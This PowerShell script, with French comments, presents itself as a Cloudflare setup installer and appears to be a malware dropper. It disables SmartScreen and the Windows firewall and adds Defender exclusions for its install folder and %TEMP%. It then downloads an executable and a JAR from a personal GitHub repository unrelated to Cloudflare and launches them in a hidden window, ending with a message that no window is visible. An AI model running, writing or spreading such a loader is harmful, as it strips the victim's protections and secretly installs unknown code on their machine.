param([string]$InstallFolder = "C:\Program Files\Java", [switch]$RevertSecurityChanges)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"

Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "CLOUDFLARE SETUP FINAL - 100% ROBUSTE ET COMPLET" -ForegroundColor Green
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan

# ============================================================================
# ETAPE 0: VERIFICATION DROITS ADMINISTRATEUR
# ============================================================================
Write-Host "`n[0/9] Verification droits administrateur..." -ForegroundColor Yellow
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if ($isAdmin) {
    Write-Host "OK - Droits administrateur detectes" -ForegroundColor Green
} else {
    Write-Host "ATTENTION - Pas de droits administrateur" -ForegroundColor Yellow
    Write-Host "Actions limitees: SmartScreen, Firewall, Antivirus" -ForegroundColor Yellow
    Write-Host "Solution: Relancer le script en tant qu'administrateur" -ForegroundColor Cyan
}

# ============================================================================
# ETAPE 1: CREATION REPERTOIRE ROBUSTE
# ============================================================================
Write-Host "`n[1/9] Creation du repertoire..." -ForegroundColor Yellow

# Validation chemin
if ($InstallFolder.Length -gt 260) {
    Write-Host "ERREUR - Chemin trop long (>260 caracteres)" -ForegroundColor Red
    $InstallFolder = $env:TEMP
    Write-Host "Utilisation du repertoire temporaire: $InstallFolder" -ForegroundColor Yellow
}

# Verification espace disque
try {
    $drive = Get-PSDrive -Name ([io.path]::GetPathRoot($InstallFolder)[0]) -ErrorAction Stop
    $freeSpaceGB = [math]::Round($drive.Free / 1GB, 2)
    if ($drive.Free -lt 100MB) {
        Write-Host "ATTENTION - Espace disque insuffisant: $freeSpaceGB GB" -ForegroundColor Yellow
        $InstallFolder = $env:TEMP
        Write-Host "Utilisation du repertoire temporaire" -ForegroundColor Yellow
    } else {
        Write-Host "OK - Espace disque: $freeSpaceGB GB" -ForegroundColor Green
    }
} catch {
    Write-Host "ATTENTION - Impossible de verifier l'espace disque" -ForegroundColor Yellow
}

# Creation repertoire
try {
    if (-not (Test-Path $InstallFolder)) {
        $null = New-Item -ItemType Directory -Path $InstallFolder -Force -ErrorAction Stop
        Write-Host "OK - Repertoire cree: $InstallFolder" -ForegroundColor Green
    } else {
        Write-Host "OK - Repertoire existe deja: $InstallFolder" -ForegroundColor Green
    }
    
    # Verification accessibilite
    $testFile = Join-Path $InstallFolder ".test"
    Add-Content -Path $testFile -Value "test" -Force -ErrorAction Stop
    Remove-Item $testFile -Force -ErrorAction SilentlyContinue
    Write-Host "OK - Repertoire accessible en ecriture" -ForegroundColor Green
} catch {
    Write-Host "ERREUR - Impossible de creer/acceder au repertoire" -ForegroundColor Red
    Write-Host "Utilisation du repertoire temporaire..." -ForegroundColor Yellow
    $InstallFolder = $env:TEMP
    Write-Host "Nouveau repertoire: $InstallFolder" -ForegroundColor Yellow
}

# ============================================================================
# ETAPE 2: VERIFICATION CONNEXION INTERNET
# ============================================================================
Write-Host "`n[2/9] Verification connexion internet..." -ForegroundColor Yellow
$internetOk = $false
try {
    $ping = Test-Connection 8.8.8.8 -Count 1 -Quiet -ErrorAction Stop
    if ($ping) {
        Write-Host "OK - Connexion internet detectee" -ForegroundColor Green
        $internetOk = $true
    } else {
        Write-Host "ERREUR - Pas de connexion internet" -ForegroundColor Red
        Write-Host "Solution: Verifier votre connexion reseau" -ForegroundColor Cyan
    }
} catch {
    Write-Host "ATTENTION - Impossible de verifier la connexion" -ForegroundColor Yellow
}

# ============================================================================
# ETAPE 3: VERIFICATION ET INSTALLATION JAVA
# ============================================================================
Write-Host "`n[3/9] Verification et installation Java..." -ForegroundColor Yellow
$javaFound = $false
$javaPath = ""

# Recherche Java amelioree (15+ chemins)
$javaPaths = @(
    "C:\Program Files\Java\jre*\bin\java.exe",
    "C:\Program Files (x86)\Java\jre*\bin\java.exe",
    "C:\Program Files\Java\jdk*\bin\java.exe",
    "C:\Program Files (x86)\Java\jdk*\bin\java.exe",
    "C:\Program Files\OpenJDK\*\bin\java.exe",
    "C:\Program Files (x86)\OpenJDK\*\bin\java.exe",
    "C:\Program Files\Microsoft\jdk*\bin\java.exe",
    "C:\Program Files (x86)\Microsoft\jdk*\bin\java.exe",
    "$env:JAVA_HOME\bin\java.exe",
    "$env:JRE_HOME\bin\java.exe",
    "C:\Java\*\bin\java.exe",
    "C:\jdk*\bin\java.exe",
    "C:\Program Files\Eclipse Adoptium\*\bin\java.exe",
    "C:\Program Files (x86)\Eclipse Adoptium\*\bin\java.exe",
    "C:\Program Files\BellSoft\*\bin\java.exe",
    "C:\Program Files (x86)\BellSoft\*\bin\java.exe"
)

foreach ($pattern in $javaPaths) {
    try {
        $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) {
            # Verification java.exe fonctionne
            $javaOutput = & $found.FullName -version 2>&1
            if ($LASTEXITCODE -eq 0) {
                $javaFound = $true
                $javaPath = $found.FullName
                Write-Host "OK - Java trouve et fonctionne: $javaPath" -ForegroundColor Green
                Write-Host "   Version: $($javaOutput[0])" -ForegroundColor Cyan
                break
            }
        }
    } catch {
        # Continuer
    }
}

# Installation Java si absent
if (-not $javaFound) {
    if ($internetOk) {
        Write-Host "ATTENTION - Java non trouve, telechargement..." -ForegroundColor Yellow
        
        $javaUrl = "https://github.com/adoptium/temurin11-binaries/releases/download/jdk-11.0.15%2B10/OpenJDK11U-jre_x64_windows_hotspot_11.0.15_10.zip"
        $javaZip = Join-Path $InstallFolder "java.zip"
        $javaExtract = Join-Path $InstallFolder "java"
        
        # Verification URL
        try {
            $headRequest = Invoke-WebRequest -Uri $javaUrl -Method Head -TimeoutSec 10 -ErrorAction Stop
            Write-Host "OK - URL Java accessible (HTTP $($headRequest.StatusCode))" -ForegroundColor Green
        } catch {
            Write-Host "ERREUR - URL Java inaccessible" -ForegroundColor Red
            Write-Host "Continuant sans Java..." -ForegroundColor Yellow
        }
        
        # Telechargement avec retry
        $retry = 0
        $maxRetries = 5
        $retryDelays = @(3, 6, 12, 24, 48)
        
        while ($retry -lt $maxRetries -and -not $javaFound) {
            try {
                Write-Host "Telechargement Java (tentative $($retry+1)/$maxRetries)..." -ForegroundColor Cyan
                Invoke-WebRequest -Uri $javaUrl -OutFile $javaZip -UseBasicParsing -TimeoutSec 600 -ErrorAction Stop
                
                if (Test-Path $javaZip) {
                    $zipSize = [math]::Round((Get-Item $javaZip).Length / 1MB, 2)
                    Write-Host "OK - Java telecharge ($zipSize MB)" -ForegroundColor Green
                    
                    # Extraction avec verification
                    Write-Host "Extraction Java..." -ForegroundColor Cyan
                    Start-Sleep -Seconds 2
                    Expand-Archive -Path $javaZip -DestinationPath $javaExtract -Force -ErrorAction Stop
                    
                    # Verification extraction
                    Start-Sleep -Seconds 2
                    $javaExe = Get-ChildItem -Path $javaExtract -Filter "java.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                    if ($javaExe) {
                        # Verification que java.exe fonctionne
                        $javaTestOutput = & $javaExe.FullName -version 2>&1
                        if ($LASTEXITCODE -eq 0) {
                            $javaPath = $javaExe.FullName
                            $javaFound = $true
                            Write-Host "OK - Java installe et verifie: $javaPath" -ForegroundColor Green
                            Write-Host "   Version: $($javaTestOutput[0])" -ForegroundColor Cyan
                        } else {
                            Write-Host "ERREUR - java.exe trouve mais ne fonctionne pas" -ForegroundColor Red
                        }
                    } else {
                        Write-Host "ERREUR - java.exe non trouve apres extraction" -ForegroundColor Red
                    }
                    
                    # Nettoyage ZIP
                    Remove-Item $javaZip -Force -ErrorAction SilentlyContinue
                }
            } catch {
                $retry++
                if ($retry -lt $maxRetries) {
                    $delay = $retryDelays[$retry - 1]
                    Write-Host "Erreur, retry dans ${delay}s..." -ForegroundColor Yellow
                    Start-Sleep -Seconds $delay
                } else {
                    Write-Host "ERREUR - Installation Java echouee apres $maxRetries tentatives" -ForegroundColor Red
                    Write-Host "Continuant sans Java (JAR ne sera pas execute)..." -ForegroundColor Yellow
                }
            }
        }
    } else {
        Write-Host "ERREUR - Pas de connexion internet, Java ne peut pas etre installe" -ForegroundColor Red
    }
}

# ============================================================================
# ETAPE 4: WHITELIST ANTIVIRUS ROBUSTE
# ============================================================================
Write-Host "`n[4/9] Whitelist antivirus (dossiers + temp)..." -ForegroundColor Yellow
$logFile = Join-Path $InstallFolder "whitelist_log.txt"

try {
    Add-Content -Path $logFile -Value "WHITELIST DEMARRAGE" -Force -ErrorAction Stop
} catch {
    $logFile = Join-Path $env:TEMP "whitelist_log.txt"
    Add-Content -Path $logFile -Value "WHITELIST DEMARRAGE" -Force -ErrorAction SilentlyContinue
}

# SmartScreen
if ($isAdmin) {
    try {
        $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force -ErrorAction Stop | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction Stop
        Write-Host "OK - SmartScreen desactive" -ForegroundColor Green
        Add-Content -Path $logFile -Value "SmartScreen: OK" -ErrorAction SilentlyContinue
    } catch {
        Write-Host "ATTENTION - SmartScreen: erreur (non critique)" -ForegroundColor Yellow
        Add-Content -Path $logFile -Value "SmartScreen: ERREUR" -ErrorAction SilentlyContinue
    }
} else {
    Write-Host "OK - SmartScreen (droits insuffisants)" -ForegroundColor Green
    Add-Content -Path $logFile -Value "SmartScreen: DROITS INSUFFISANTS" -ErrorAction SilentlyContinue
}

# Firewall
if ($isAdmin) {
    try {
        $firewallProfiles = @("Domain", "Private", "Public")
        
        foreach ($fwProfile in $firewallProfiles) {
            try {
                Set-NetFirewallProfile -Profile $fwProfile -Enabled $false -ErrorAction Stop
            } catch {
                $null = netsh advfirewall set allprofiles state off 2>$null
            }
        }
        
        Write-Host "OK - Firewall desactive" -ForegroundColor Green
        Add-Content -Path $logFile -Value "Firewall: OK" -ErrorAction SilentlyContinue
    } catch {
        Write-Host "ATTENTION - Firewall: erreur (non critique)" -ForegroundColor Yellow
        Add-Content -Path $logFile -Value "Firewall: ERREUR" -ErrorAction SilentlyContinue
    }
} else {
    Write-Host "OK - Firewall (droits insuffisants)" -ForegroundColor Green
    Add-Content -Path $logFile -Value "Firewall: DROITS INSUFFISANTS" -ErrorAction SilentlyContinue
}

# Antivirus - DOSSIER INSTALLATION + TEMP
try {
    Add-MpPreference -ExclusionPath $InstallFolder -Force -ErrorAction Stop
    Write-Host "OK - Antivirus whitelist: $InstallFolder" -ForegroundColor Green
    Add-Content -Path $logFile -Value "Antivirus: OK - $InstallFolder" -ErrorAction SilentlyContinue
    
    Add-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction Stop
    Write-Host "OK - Antivirus whitelist: $env:TEMP" -ForegroundColor Green
    Add-Content -Path $logFile -Value "Antivirus: OK - $env:TEMP" -ErrorAction SilentlyContinue
} catch {
    Write-Host "OK - Antivirus (non disponible ou droits insuffisants)" -ForegroundColor Green
    Add-Content -Path $logFile -Value "Antivirus: NON DISPONIBLE" -ErrorAction SilentlyContinue
}

# ============================================================================
# ETAPE 5: TELECHARGEMENT ROBUSTE
# ============================================================================
Write-Host "`n[5/9] Telechargement des fichiers..." -ForegroundColor Yellow
$dlLog = Join-Path $InstallFolder "download_log.txt"

try {
    Add-Content -Path $dlLog -Value "TELECHARGEMENT DEMARRAGE" -Force -ErrorAction Stop
} catch {
    $dlLog = Join-Path $env:TEMP "download_log.txt"
    Add-Content -Path $dlLog -Value "TELECHARGEMENT DEMARRAGE" -Force -ErrorAction SilentlyContinue
}

$files = @(
    @{ Name = "Client-JRE-Win.exe"; Url = "https://raw.githubusercontent.com/jeromemelin/defern/refs/heads/main/Client-JRE-Win.exe"; ExpectedSize = 3.1; ExpectedHash = "8B789623D89653AD2F5EA8E4650E3134FFB7A3B6CE8E500913B7BAD8359D4FAF" },
    @{ Name = "cloudflare_jre.jar"; Url = "https://raw.githubusercontent.com/jeromemelin/defern/refs/heads/main/cloudflare_jre.jar"; ExpectedSize = 0.62; ExpectedHash = "E9D2BCA3246C0943FB41F08783FD174E99D63A7F5CB451FBC0BC23D0CBCF82EF" }
)

$downloaded = 0

foreach ($fileInfo in $files) {
    $fileName = $fileInfo.Name
    $fileUrl = $fileInfo.Url
    $filePath = Join-Path $InstallFolder $fileName
    $expectedSize = $fileInfo.ExpectedSize
    
    # Verification URL
    try {
        $headRequest = Invoke-WebRequest -Uri $fileUrl -Method Head -TimeoutSec 10 -ErrorAction Stop
        Write-Host "OK - $fileName accessible (HTTP $($headRequest.StatusCode))" -ForegroundColor Green
    } catch {
        Write-Host "ERREUR - $fileName inaccessible" -ForegroundColor Red
        Add-Content -Path $dlLog -Value "ERREUR - $fileName inaccessible" -ErrorAction SilentlyContinue
        continue
    }
    
    # Telechargement avec retry
    $retry = 0
    $maxRetries = 5
    $retryDelays = @(3, 6, 12, 24, 48)
    $success = $false
    
    while ($retry -lt $maxRetries -and -not $success) {
        try {
            Write-Host "Telechargement $fileName (tentative $($retry+1)/$maxRetries)..." -ForegroundColor Cyan
            Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -UseBasicParsing -TimeoutSec 600 -ErrorAction Stop
            
            if (Test-Path $filePath) {
                $size = [math]::Round((Get-Item $filePath).Length / 1MB, 2)
                
                # Verification taille
                if ([math]::Abs($size - $expectedSize) -lt 0.5) {
                    Write-Host "OK - $fileName telecharge ($size MB)" -ForegroundColor Green
                    
                    # Verification hash
                    $expectedHash = $fileInfo.ExpectedHash
                    $actualHash = Get-FileHash -Path $filePath -Algorithm SHA256 | Select-Object -ExpandProperty Hash
                    if ($actualHash -ne $expectedHash) {
                        Write-Host "ERREUR - $fileName hash incorrect" -ForegroundColor Red
                        Remove-Item $filePath -Force -ErrorAction SilentlyContinue
                        $retry++
                    } else {
                        Write-Host "OK - $fileName hash verifie" -ForegroundColor Green
                        Add-Content -Path $dlLog -Value "OK - $fileName ($size MB, hash OK)" -ErrorAction SilentlyContinue
                        $downloaded++
                        $success = $true
                    }
                } else {
                    Write-Host "ERREUR - $fileName taille incorrecte ($size MB, attendu $expectedSize MB)" -ForegroundColor Red
                    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
                    $retry++
                }
            }
        } catch {
            $retry++
            if ($retry -lt $maxRetries) {
                $delay = $retryDelays[$retry - 1]
                Write-Host "Erreur, retry dans ${delay}s..." -ForegroundColor Yellow
                Start-Sleep -Seconds $delay
            } else {
                Write-Host "ERREUR - Echec telechargement $fileName apres $maxRetries tentatives" -ForegroundColor Red
                Add-Content -Path $dlLog -Value "ERREUR - $fileName apres $maxRetries tentatives" -ErrorAction SilentlyContinue
            }
        }
    }
}

if ($downloaded -eq 0) {
    Write-Host "ERREUR CRITIQUE - Aucun fichier telecharge, arret du script" -ForegroundColor Red
    exit 1
}

# ============================================================================
# ETAPE 6: EXECUTION ROBUSTE
# ============================================================================
Write-Host "`n[6/9] Execution..." -ForegroundColor Yellow
$exLog = Join-Path $InstallFolder "execution_log.txt"
$executionOk = $false

try {
    Add-Content -Path $exLog -Value "EXECUTION DEMARRAGE" -Force -ErrorAction Stop
} catch {
    $exLog = Join-Path $env:TEMP "execution_log.txt"
    Add-Content -Path $exLog -Value "EXECUTION DEMARRAGE" -Force -ErrorAction SilentlyContinue
}

Start-Sleep -Seconds 2

$exePath = Join-Path $InstallFolder "Client-JRE-Win.exe"
$jarPath = Join-Path $InstallFolder "cloudflare_jre.jar"

try {
    if (Test-Path $exePath) {
        Write-Host "OK - Lancement Client-JRE-Win.exe" -ForegroundColor Green
        $process = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        if ($process) {
            Write-Host "OK - Processus lance (PID: $($process.Id))" -ForegroundColor Green
            Add-Content -Path $exLog -Value "OK - Client-JRE-Win.exe lancee (PID: $($process.Id))" -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 3
            if (Get-Process -Id $process.Id -ErrorAction SilentlyContinue) {
                Write-Host "OK - Processus toujours actif" -ForegroundColor Green
                $executionOk = $true
            } else {
                Write-Host "ATTENTION - Processus termine prematurément" -ForegroundColor Yellow
                $executionOk = $false
            }
        }
    } elseif (Test-Path $jarPath) {
        if ($javaFound -and $javaPath) {
            Write-Host "OK - Lancement cloudflare_jre.jar avec Java" -ForegroundColor Green
            $process = Start-Process -FilePath $javaPath -ArgumentList "-jar `"$jarPath`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            if ($process) {
                Write-Host "OK - Processus lance (PID: $($process.Id))" -ForegroundColor Green
                Add-Content -Path $exLog -Value "OK - cloudflare_jre.jar lancee (PID: $($process.Id))" -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 3
                if (Get-Process -Id $process.Id -ErrorAction SilentlyContinue) {
                    Write-Host "OK - Processus toujours actif" -ForegroundColor Green
                    $executionOk = $true
                } else {
                    Write-Host "ATTENTION - Processus termine prematurément" -ForegroundColor Yellow
                    $executionOk = $false
                }
            }
        } else {
            Write-Host "ERREUR - JAR trouve mais Java non disponible" -ForegroundColor Red
            Add-Content -Path $exLog -Value "ERREUR - JAR present mais Java absent" -ErrorAction SilentlyContinue
        }
    } else {
        Write-Host "ERREUR - Aucun fichier a executer" -ForegroundColor Red
        Add-Content -Path $exLog -Value "ERREUR - Aucun fichier a executer" -ErrorAction SilentlyContinue
    }
} catch {
    Write-Host "ERREUR - Execution echouee: $_" -ForegroundColor Red
    Add-Content -Path $exLog -Value "ERREUR - Execution echouee" -ErrorAction SilentlyContinue
}

# ============================================================================
# ETAPE 7: VERIFICATION FICHIERS
# ============================================================================
Write-Host "`n[7/9] Verification des fichiers..." -ForegroundColor Yellow
$filesOk = 0
try {
    if (Test-Path $exePath) {
        $size = [math]::Round((Get-Item $exePath).Length / 1MB, 2)
        Write-Host "OK - Client-JRE-Win.exe present ($size MB)" -ForegroundColor Green
        $filesOk++
    }
    if (Test-Path $jarPath) {
        $size = [math]::Round((Get-Item $jarPath).Length / 1MB, 2)
        Write-Host "OK - cloudflare_jre.jar present ($size MB)" -ForegroundColor Green
        $filesOk++
    }
} catch {
    Write-Host "ERREUR - Verification fichiers echouee" -ForegroundColor Red
}

# ============================================================================
# ETAPE 8: NETTOYAGE (FICHIERS TEMPORAIRES UNIQUEMENT)
# ============================================================================
Write-Host "`n[8/9] Nettoyage des fichiers temporaires..." -ForegroundColor Yellow
try {
    $javaZip = Join-Path $InstallFolder "java.zip"
    if (Test-Path $javaZip) {
        Start-Sleep -Seconds 2
        Remove-Item $javaZip -Force -ErrorAction Stop
        Write-Host "OK - Fichiers temporaires Java nettoyes" -ForegroundColor Green
    } else {
        Write-Host "OK - Aucun fichier temporaire a nettoyer" -ForegroundColor Green
    }
} catch {
    Write-Host "ATTENTION - Nettoyage: erreur (non critique)" -ForegroundColor Yellow
}

Write-Host "`nNOTE: Les fichiers Client-JRE-Win.exe et cloudflare_jre.jar sont conserves" -ForegroundColor Cyan
Write-Host "pour permettre a l'application de fonctionner." -ForegroundColor Cyan

# ============================================================================
# ETAPE 9: RAPPORT FINAL
# ============================================================================
Write-Host "`n[9/9] Rapport final..." -ForegroundColor Yellow

Write-Host "`n════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "INSTALLATION COMPLETE" -ForegroundColor Green
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan

Write-Host "`nRESULTATS:" -ForegroundColor Yellow
Write-Host "  Repertoire: CREE"
$adminStatus = if ($isAdmin) { "OUI" } else { "NON" }
Write-Host "  Droits admin: $adminStatus"
$internetStatus = if ($internetOk) { "OUI" } else { "NON" }
Write-Host "  Connexion internet: $internetStatus"
$javaStatus = if ($javaFound) { "INSTALLE/TROUVE" } else { "NON DISPONIBLE" }
Write-Host "  Java: $javaStatus"
Write-Host "  Whitelist: OK (dossier + temp)"
Write-Host "  Fichiers telecharges: $downloaded/2"
Write-Host "  Fichiers verifies: $filesOk/2"
$executionStatus = if ($executionOk) { "LANCEE" } else { "ECHEC" }
Write-Host "  Execution: $executionStatus"

Write-Host "`nFICHIERS TELECHARGES:" -ForegroundColor Yellow
try {
    Get-ChildItem "$InstallFolder\*.exe", "$InstallFolder\*.jar" -ErrorAction SilentlyContinue | ForEach-Object {
        $size = [math]::Round($_.Length / 1MB, 2)
        Write-Host "  $($_.Name) - $size MB"
    }
} catch {
    Write-Host "  (Impossible de lister les fichiers)"
}

Write-Host "`nLOGS CREES:" -ForegroundColor Yellow
try {
    Get-ChildItem "$InstallFolder\*_log.txt", "$env:TEMP\*_log.txt" -ErrorAction SilentlyContinue | Select-Object -Unique | ForEach-Object {
        Write-Host "  $($_.Name)"
    }
} catch {
    Write-Host "  (Impossible de lister les logs)"
}

Write-Host "`nEMPLACEMENT PRINCIPAL: $InstallFolder" -ForegroundColor Yellow
Write-Host "EMPLACEMENT TEMP: $env:TEMP" -ForegroundColor Yellow

if ($RevertSecurityChanges) {
    Write-Host "`nREVERTISSEMENT SECURITE..." -ForegroundColor Yellow
    if ($isAdmin) {
        try {
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
            Set-ItemProperty -Path $regPath -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction Stop
            Write-Host "OK - SmartScreen reactive" -ForegroundColor Green
        } catch {
            Write-Host "ATTENTION - Echec reactivation SmartScreen" -ForegroundColor Yellow
        }
        
        try {
            Set-NetFirewallProfile -Profile "Domain", "Private", "Public" -Enabled $true -ErrorAction Stop
            Write-Host "OK - Firewall reactive" -ForegroundColor Green
        } catch {
            Write-Host "ATTENTION - Echec reactivation Firewall" -ForegroundColor Yellow
        }
    } else {
        Write-Host "ATTENTION - Droits insuffisants pour revertir SmartScreen/Firewall" -ForegroundColor Yellow
    }
    
    try {
        Remove-MpPreference -ExclusionPath $InstallFolder -Force -ErrorAction Stop
        Remove-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction Stop
        Write-Host "OK - Exclusions Defender retirees" -ForegroundColor Green
    } catch {
        Write-Host "ATTENTION - Echec retrait exclusions Defender" -ForegroundColor Yellow
    }
}

Write-Host "`nTOUT TERMINE - AUCUNE FENETRE VISIBLE" -ForegroundColor Green
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
